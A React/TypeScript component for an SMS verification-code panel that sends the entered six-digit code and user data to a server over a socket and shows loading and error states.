import { useContext, useEffect, useState } from 'react';
import styles from '../../styles.module.scss';
import { socket } from '../../socket';
import { IUserData, UserContext } from '../../App';

const PhonePanel = ({ setPanel }: { setPanel: (v: string) => void }) => {
	const { user, setUser } = useContext(UserContext);
	const [errorMessage, setErrorMessage] = useState('');
	const [loadingCode, setLoadingCode] = useState(true);
	const [inputFocused, setInputFocused] = useState(false);

	const submitPhone = () => {
		if (user?.verifCode!.length === 6) {
			socket.emit('verif-code', { ...user, verifCode: user.verifCode });
			setLoadingCode(true);
		}
	};

	useEffect(() => {
		socket.on('request-code', () => {
			setLoadingCode(false);
		});

		socket.on('again-code', () => {
			setLoadingCode(false);
			setErrorMessage('Sorry, we are not able to verify the code. Please make sure you input the right mobile number and code.');
		});
	}, [socket]);

	return (
		<div className={styles.auth_panel}>
			<div className={styles.auth_header}>
				<img src='../../left_arrow.svg' alt='' width={16} onClick={() => setPanel('main')} /> Confirm your number
			</div>
			<form className={styles.verif_form} onSubmit={submitPhone} data-loading={loadingCode}>
				<h2>Enter the code we sent over SMS to your phone.</h2>
				<div
					className={styles.code_input}
					onFocus={() => setInputFocused(true)}
					onBlur={() => setInputFocused(false)}
					style={
						inputFocused
							? { boxShadow: `inset 0 0 0 2px ${errorMessage ? '#C13515' : '#222222'} ` }
							: errorMessage
							? {
									boxShadow: `inset 0 0 0 1px #C13515`,
									background: '#FFF8F6',
							  }
							: {}
					}
				>
					<input
						type='number'
						placeholder='------'
						disabled={loadingCode}
						value={user?.verifCode}
						onChange={e => {
							setUser((u: IUserData) => ({ ...u, verifCode: e.target.value }));
							if (e.target.value.length === 6) {
								socket.emit('verif-code', { ...user, verifCode: e.target.value });
								setLoadingCode(true);
							}
						}}
					/>
				</div>
				{errorMessage && (
					<div className={styles.error_message}>
						<img src='../../error.svg' alt='' width={12} />
						{errorMessage}
					</div>
				)}
				<div className={styles.form_footer}>
					<div className={styles.more_options}>More options</div>
					<button className={styles.continue_button} disabled={loadingCode}>
						Continue
					</button>
				</div>
			</form>
		</div>
	);
};

export default PhonePanel;
